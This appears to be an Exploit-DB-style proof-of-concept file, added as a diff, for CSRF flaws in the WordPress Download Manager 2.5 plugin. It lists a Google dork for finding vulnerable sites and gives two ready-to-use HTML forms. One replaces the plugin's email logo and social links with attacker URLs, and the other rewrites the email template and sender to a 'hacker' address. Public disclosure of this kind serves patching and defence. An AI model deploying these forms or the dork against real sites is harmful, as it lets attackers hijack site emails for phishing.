@@ -1,0 +1,51 @@
+# Exploit Title: CSRF vulnerabilities in WordPress Download Manager Plugin 2.5
+# Google Dork: inurl:"/wp-content/plugins/download-manager
+# Date: 24 may, 2019
+# Exploit Author: Princy Edward
+# Exploit Author Blog : https://prinyedward.blogspot.com/
+# Vendor Homepage: https://www.wpdownloadmanager.com/
+# Software Link: https://wordpress.org/plugins/download-manager/
+# Tested on: Apache/2.2.24 (CentOS)
+POC 
+
+#1 
+
+There is no CSRF nonce check performed in "POST
+/wp-admin/admin-ajax.php?action=wpdm_save_email_setting" request. 
+
+#Code
+
+<form method="POST"
+action="http://localhost/wp-admin/admin-ajax.php?action=wpdm_save_email_setting">
+<input type="hidden" name="__wpdm_email_template" value="default.html">
+<input type="hidden" name="__wpdm_email_setting[logo]"
+value="https://hacker.jpg">
+<input type="hidden" name="__wpdm_email_setting[banner]"
+value="https://hacker.jpg">
+<input type="hidden" name="__wpdm_email_setting[footer_text]"
+value="https://malicious-url.com"><input type="hidden" name="__wpdm_email_setting[facebook]"
+value="https://malicious-url.com">
+<input type="hidden" name="__wpdm_email_setting[twitter]" value="https://malicious-url.com">
+<input type="hidden" name="__wpdm_email_setting[youtube]"
+value="https://malicious-url.com">
+<input type="submit">
+</form>
+
+#2
+
+There is no CSRF nonce check performed in "POST
+/wp-admin/edit.php?post_type=wpdmpro&page=templates&_type=email&task=EditEmailTemplat
+e&id=default" request.
+
+#Code
+
+<form method="POST"
+action="http://localhost/wp-admin/edit.php?post_type=wpdmpro&page=templates&_type=email&
+task=EditEmailTemplate&id=default">
+<input type="hidden" name="id" value="default">
+<input type="hidden" name="email_template[subject]" value="forget password">
+<input type="hidden" name="email_template[message]" value="aaa">
+<input type="hidden" name="email_template[from_name]" value="hacker">
+<input type="hidden" name="email_template[from_email]" value="hacker@hacker.com">
+<input type="submit">
+</form>
